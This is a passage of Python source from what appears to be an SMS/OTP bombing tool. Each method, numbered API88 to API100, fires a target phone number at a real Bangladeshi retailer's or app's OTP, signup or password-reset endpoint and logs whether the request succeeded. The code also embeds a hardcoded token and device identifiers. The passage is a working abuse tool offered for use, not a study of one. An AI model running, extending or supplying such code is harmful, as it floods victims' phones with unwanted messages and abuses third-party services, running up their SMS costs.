                    success = res.status in [200, 201]
                    await self.log_event("API88 - Carrybee Forget Password", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API88 - Carrybee Forget Password", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api89_cartup_signup(self):
        target = self.target
        url = "https://api.cartup.com/customer/api/v1/customer/auth/new-onboard/signup"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API89 - CartUp Signup": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API89 - CartUp Signup": pass
            elif "Bioscope" in "API89 - CartUp Signup": payload = {"number": "+88" + target}
            elif "Proiojon" in "API89 - CartUp Signup": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API89 - CartUp Signup": payload = {"phone": target}
            elif "Medha" in "API89 - CartUp Signup": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API89 - CartUp Signup": payload = {"number": "+88" + target}
            elif "Robi" in "API89 - CartUp Signup": payload = {"phone_number": target}
            elif "Arogga" in "API89 - CartUp Signup": payload = {"mobile": target}
            elif "MyGP" in "API89 - CartUp Signup": pass
            elif "BDSTall" in "API89 - CartUp Signup": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API89 - CartUp Signup": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API89 - CartUp Signup": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API89 - CartUp Signup": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API89 - CartUp Signup": payload = {"phoneNumber": target}
            elif "Sindabad" in "API89 - CartUp Signup": payload = {"mobile": target}
            elif "Kirei" in "API89 - CartUp Signup": payload = {"phone": target}
            elif "Shikho" in "API89 - CartUp Signup": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API89 - CartUp Signup": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API89 - CartUp Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API89 - CartUp Signup", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API89 - CartUp Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api90_easyfashion_digits_otp(self):
        target = self.target
        url = "https://easyfashion.com.bd/wp-admin/admin-ajax.php"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API90 - EasyFashion Digits OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API90 - EasyFashion Digits OTP": pass
            elif "Bioscope" in "API90 - EasyFashion Digits OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API90 - EasyFashion Digits OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API90 - EasyFashion Digits OTP": payload = {"phone": target}
            elif "Medha" in "API90 - EasyFashion Digits OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API90 - EasyFashion Digits OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API90 - EasyFashion Digits OTP": payload = {"phone_number": target}
            elif "Arogga" in "API90 - EasyFashion Digits OTP": payload = {"mobile": target}
            elif "MyGP" in "API90 - EasyFashion Digits OTP": pass
            elif "BDSTall" in "API90 - EasyFashion Digits OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API90 - EasyFashion Digits OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API90 - EasyFashion Digits OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API90 - EasyFashion Digits OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API90 - EasyFashion Digits OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API90 - EasyFashion Digits OTP": payload = {"mobile": target}
            elif "Kirei" in "API90 - EasyFashion Digits OTP": payload = {"phone": target}
            elif "Shikho" in "API90 - EasyFashion Digits OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API90 - EasyFashion Digits OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API90 - EasyFashion Digits OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API90 - EasyFashion Digits OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API90 - EasyFashion Digits OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api91_sara_lifestyle_otp(self):
        target = self.target
        url = "https://prod.saralifestyle.com/api/Master/SendTokenV1"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API91 - Sara Lifestyle OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API91 - Sara Lifestyle OTP": pass
            elif "Bioscope" in "API91 - Sara Lifestyle OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API91 - Sara Lifestyle OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API91 - Sara Lifestyle OTP": payload = {"phone": target}
            elif "Medha" in "API91 - Sara Lifestyle OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API91 - Sara Lifestyle OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API91 - Sara Lifestyle OTP": payload = {"phone_number": target}
            elif "Arogga" in "API91 - Sara Lifestyle OTP": payload = {"mobile": target}
            elif "MyGP" in "API91 - Sara Lifestyle OTP": pass
            elif "BDSTall" in "API91 - Sara Lifestyle OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API91 - Sara Lifestyle OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API91 - Sara Lifestyle OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API91 - Sara Lifestyle OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API91 - Sara Lifestyle OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API91 - Sara Lifestyle OTP": payload = {"mobile": target}
            elif "Kirei" in "API91 - Sara Lifestyle OTP": payload = {"phone": target}
            elif "Shikho" in "API91 - Sara Lifestyle OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API91 - Sara Lifestyle OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API91 - Sara Lifestyle OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API91 - Sara Lifestyle OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API91 - Sara Lifestyle OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api92_electronics_bangladesh_otp(self):
        target = self.target
        url = "https://storeapi.electronicsbangladesh.com/api/auth/send-otp-for-login"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API92 - Electronics Bangladesh OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API92 - Electronics Bangladesh OTP": pass
            elif "Bioscope" in "API92 - Electronics Bangladesh OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API92 - Electronics Bangladesh OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API92 - Electronics Bangladesh OTP": payload = {"phone": target}
            elif "Medha" in "API92 - Electronics Bangladesh OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API92 - Electronics Bangladesh OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API92 - Electronics Bangladesh OTP": payload = {"phone_number": target}
            elif "Arogga" in "API92 - Electronics Bangladesh OTP": payload = {"mobile": target}
            elif "MyGP" in "API92 - Electronics Bangladesh OTP": pass
            elif "BDSTall" in "API92 - Electronics Bangladesh OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API92 - Electronics Bangladesh OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API92 - Electronics Bangladesh OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API92 - Electronics Bangladesh OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API92 - Electronics Bangladesh OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API92 - Electronics Bangladesh OTP": payload = {"mobile": target}
            elif "Kirei" in "API92 - Electronics Bangladesh OTP": payload = {"phone": target}
            elif "Shikho" in "API92 - Electronics Bangladesh OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API92 - Electronics Bangladesh OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API92 - Electronics Bangladesh OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API92 - Electronics Bangladesh OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API92 - Electronics Bangladesh OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api93_esquire_electronics_check_user(self):
        target = self.target
        url = "https://api.ecommerce.esquireelectronicsltd.com/api/user/check-user-for-registration"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API93 - Esquire Electronics Check User": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API93 - Esquire Electronics Check User": pass
            elif "Bioscope" in "API93 - Esquire Electronics Check User": payload = {"number": "+88" + target}
            elif "Proiojon" in "API93 - Esquire Electronics Check User": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API93 - Esquire Electronics Check User": payload = {"phone": target}
            elif "Medha" in "API93 - Esquire Electronics Check User": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API93 - Esquire Electronics Check User": payload = {"number": "+88" + target}
            elif "Robi" in "API93 - Esquire Electronics Check User": payload = {"phone_number": target}
            elif "Arogga" in "API93 - Esquire Electronics Check User": payload = {"mobile": target}
            elif "MyGP" in "API93 - Esquire Electronics Check User": pass
            elif "BDSTall" in "API93 - Esquire Electronics Check User": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API93 - Esquire Electronics Check User": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API93 - Esquire Electronics Check User": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API93 - Esquire Electronics Check User": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API93 - Esquire Electronics Check User": payload = {"phoneNumber": target}
            elif "Sindabad" in "API93 - Esquire Electronics Check User": payload = {"mobile": target}
            elif "Kirei" in "API93 - Esquire Electronics Check User": payload = {"phone": target}
            elif "Shikho" in "API93 - Esquire Electronics Check User": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API93 - Esquire Electronics Check User": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API93 - Esquire Electronics Check User", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API93 - Esquire Electronics Check User", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API93 - Esquire Electronics Check User", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api94_sheba_electronics_otp(self):
        target = self.target
        url = "https://admin.shebaelectronics.co/api/customer/register/send-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API94 - Sheba Electronics OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API94 - Sheba Electronics OTP": pass
            elif "Bioscope" in "API94 - Sheba Electronics OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API94 - Sheba Electronics OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API94 - Sheba Electronics OTP": payload = {"phone": target}
            elif "Medha" in "API94 - Sheba Electronics OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API94 - Sheba Electronics OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API94 - Sheba Electronics OTP": payload = {"phone_number": target}
            elif "Arogga" in "API94 - Sheba Electronics OTP": payload = {"mobile": target}
            elif "MyGP" in "API94 - Sheba Electronics OTP": pass
            elif "BDSTall" in "API94 - Sheba Electronics OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API94 - Sheba Electronics OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API94 - Sheba Electronics OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API94 - Sheba Electronics OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API94 - Sheba Electronics OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API94 - Sheba Electronics OTP": payload = {"mobile": target}
            elif "Kirei" in "API94 - Sheba Electronics OTP": payload = {"phone": target}
            elif "Shikho" in "API94 - Sheba Electronics OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API94 - Sheba Electronics OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API94 - Sheba Electronics OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API94 - Sheba Electronics OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API94 - Sheba Electronics OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api95_sumash_tech_otp(self):
        target = self.target
        url = "https://www.sumashtech.com/api/send-otp"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API95 - Sumash Tech OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API95 - Sumash Tech OTP": pass
            elif "Bioscope" in "API95 - Sumash Tech OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API95 - Sumash Tech OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API95 - Sumash Tech OTP": payload = {"phone": target}
            elif "Medha" in "API95 - Sumash Tech OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API95 - Sumash Tech OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API95 - Sumash Tech OTP": payload = {"phone_number": target}
            elif "Arogga" in "API95 - Sumash Tech OTP": payload = {"mobile": target}
            elif "MyGP" in "API95 - Sumash Tech OTP": pass
            elif "BDSTall" in "API95 - Sumash Tech OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API95 - Sumash Tech OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API95 - Sumash Tech OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API95 - Sumash Tech OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API95 - Sumash Tech OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API95 - Sumash Tech OTP": payload = {"mobile": target}
            elif "Kirei" in "API95 - Sumash Tech OTP": payload = {"phone": target}
            elif "Shikho" in "API95 - Sumash Tech OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API95 - Sumash Tech OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API95 - Sumash Tech OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API95 - Sumash Tech OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API95 - Sumash Tech OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api96_volthbd_registration(self):
        target = self.target
        url = "https://api.volthbd.com/api/v1/auth/registrations"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API96 - VolthBD Registration": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API96 - VolthBD Registration": pass
            elif "Bioscope" in "API96 - VolthBD Registration": payload = {"number": "+88" + target}
            elif "Proiojon" in "API96 - VolthBD Registration": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API96 - VolthBD Registration": payload = {"phone": target}
            elif "Medha" in "API96 - VolthBD Registration": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API96 - VolthBD Registration": payload = {"number": "+88" + target}
            elif "Robi" in "API96 - VolthBD Registration": payload = {"phone_number": target}
            elif "Arogga" in "API96 - VolthBD Registration": payload = {"mobile": target}
            elif "MyGP" in "API96 - VolthBD Registration": pass
            elif "BDSTall" in "API96 - VolthBD Registration": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API96 - VolthBD Registration": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API96 - VolthBD Registration": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API96 - VolthBD Registration": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API96 - VolthBD Registration": payload = {"phoneNumber": target}
            elif "Sindabad" in "API96 - VolthBD Registration": payload = {"mobile": target}
            elif "Kirei" in "API96 - VolthBD Registration": payload = {"phone": target}
            elif "Shikho" in "API96 - VolthBD Registration": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API96 - VolthBD Registration": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API96 - VolthBD Registration", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API96 - VolthBD Registration", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API96 - VolthBD Registration", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api97_rangs_shop_otp(self):
        target = self.target
        url = "https://ecom.rangs.com.bd/send-otp-code"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API97 - Rangs Shop OTP": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API97 - Rangs Shop OTP": pass
            elif "Bioscope" in "API97 - Rangs Shop OTP": payload = {"number": "+88" + target}
            elif "Proiojon" in "API97 - Rangs Shop OTP": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API97 - Rangs Shop OTP": payload = {"phone": target}
            elif "Medha" in "API97 - Rangs Shop OTP": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API97 - Rangs Shop OTP": payload = {"number": "+88" + target}
            elif "Robi" in "API97 - Rangs Shop OTP": payload = {"phone_number": target}
            elif "Arogga" in "API97 - Rangs Shop OTP": payload = {"mobile": target}
            elif "MyGP" in "API97 - Rangs Shop OTP": pass
            elif "BDSTall" in "API97 - Rangs Shop OTP": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API97 - Rangs Shop OTP": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API97 - Rangs Shop OTP": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API97 - Rangs Shop OTP": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API97 - Rangs Shop OTP": payload = {"phoneNumber": target}
            elif "Sindabad" in "API97 - Rangs Shop OTP": payload = {"mobile": target}
            elif "Kirei" in "API97 - Rangs Shop OTP": payload = {"phone": target}
            elif "Shikho" in "API97 - Rangs Shop OTP": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API97 - Rangs Shop OTP": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API97 - Rangs Shop OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API97 - Rangs Shop OTP", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API97 - Rangs Shop OTP", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api98_eyecon_app_transport(self):
        target = self.target
        url = "https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_510_vn_4.0.510_a&cli=88{phone}&reg_id=flycT4-STvehHQq5O2pTcE%3AAPA91bEpVMgtLmd4vxYZn2jSUH7_Stvvp_4Ui19ibI15gcjVJ7G9Vg5fxAW_MWy6bFtw_I67lPVJzJejjACOEBYVW_ww2_RghRxuHqGZxetBbUzt-8uB7HfKx4MM25P7WbZhn0QzGQu6&installer_name=manually+or+unknown+source&n_sims=2&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=473e9a981fddd587&time_zone=Asia%2FDhaka&device_manu=Xiaomi&device_model=Redmi+Note+7+Pro"
        method = "GET"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API98 - Eyecon App Transport": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API98 - Eyecon App Transport": pass
            elif "Bioscope" in "API98 - Eyecon App Transport": payload = {"number": "+88" + target}
            elif "Proiojon" in "API98 - Eyecon App Transport": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API98 - Eyecon App Transport": payload = {"phone": target}
            elif "Medha" in "API98 - Eyecon App Transport": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API98 - Eyecon App Transport": payload = {"number": "+88" + target}
            elif "Robi" in "API98 - Eyecon App Transport": payload = {"phone_number": target}
            elif "Arogga" in "API98 - Eyecon App Transport": payload = {"mobile": target}
            elif "MyGP" in "API98 - Eyecon App Transport": pass
            elif "BDSTall" in "API98 - Eyecon App Transport": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API98 - Eyecon App Transport": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API98 - Eyecon App Transport": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API98 - Eyecon App Transport": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API98 - Eyecon App Transport": payload = {"phoneNumber": target}
            elif "Sindabad" in "API98 - Eyecon App Transport": payload = {"mobile": target}
            elif "Kirei" in "API98 - Eyecon App Transport": payload = {"phone": target}
            elif "Shikho" in "API98 - Eyecon App Transport": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API98 - Eyecon App Transport": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API98 - Eyecon App Transport", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API98 - Eyecon App Transport", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API98 - Eyecon App Transport", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api99_vision_emporium_register(self):
        target = self.target
        url = "https://visionemporiumbd.com/"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API99 - Vision Emporium Register": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API99 - Vision Emporium Register": pass
            elif "Bioscope" in "API99 - Vision Emporium Register": payload = {"number": "+88" + target}
            elif "Proiojon" in "API99 - Vision Emporium Register": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API99 - Vision Emporium Register": payload = {"phone": target}
            elif "Medha" in "API99 - Vision Emporium Register": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API99 - Vision Emporium Register": payload = {"number": "+88" + target}
            elif "Robi" in "API99 - Vision Emporium Register": payload = {"phone_number": target}
            elif "Arogga" in "API99 - Vision Emporium Register": payload = {"mobile": target}
            elif "MyGP" in "API99 - Vision Emporium Register": pass
            elif "BDSTall" in "API99 - Vision Emporium Register": payload = {"Mobile": target, "UserTypeID": "2", "RequestType": "1"}
            elif "BCS Exam" in "API99 - Vision Emporium Register": payload = {"mobile": target, "softtoken": "Rifat.Admin.2022"}
            elif "DoctorLive" in "API99 - Vision Emporium Register": payload = {"mobile": target, "country_code": "880"}
            elif "Sheba" in "API99 - Vision Emporium Register": payload = {"mobile": "+88" + target}
            elif "Apex4U" in "API99 - Vision Emporium Register": payload = {"phoneNumber": target}
            elif "Sindabad" in "API99 - Vision Emporium Register": payload = {"mobile": target}
            elif "Kirei" in "API99 - Vision Emporium Register": payload = {"phone": target}
            elif "Shikho" in "API99 - Vision Emporium Register": payload = {"phone": target, "type": "student"}
            elif "Circle" in "API99 - Vision Emporium Register": payload = {"phone": target}
            else: payload = {"phone": target, "mobile": target, "msisdn": "880" + target}

        # Replace placeholder in URL
        final_url = url.replace("{phone}", target)
        
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API99 - Vision Emporium Register", success, res.status, fmt=current_api_fmt.get())
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("API99 - Vision Emporium Register", success, res.status, fmt=current_api_fmt.get())
                    return success
        except Exception:
            await self.log_event("API99 - Vision Emporium Register", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api100_basa18_sms(self):
        target = self.target
        url = "https://www.basa18.com/wps/v2/verification/sms/send"
        method = "POST"
        # Payload logic based on URL and name
        payload = {}
        
        # Common payload patterns
        if "{phone}" not in url:
            if "RedX" in "API100 - BASA18 SMS": payload = {"phoneNumber": target}
            elif "KhaasFood" in "API100 - BASA18 SMS": pass
            elif "Bioscope" in "API100 - BASA18 SMS": payload = {"number": "+88" + target}
            elif "Proiojon" in "API100 - BASA18 SMS": payload = {"phone": target, "name": "User", "password": "password123"}
            elif "BeautyBooth" in "API100 - BASA18 SMS": payload = {"phone": target}
            elif "Medha" in "API100 - BASA18 SMS": payload = {"phone": "880" + target, "is_register": "1"}
            elif "Deeptoplay" in "API100 - BASA18 SMS": payload = {"number": "+88" + target}
            elif "Robi" in "API100 - BASA18 SMS": payload = {"phone_number": target}
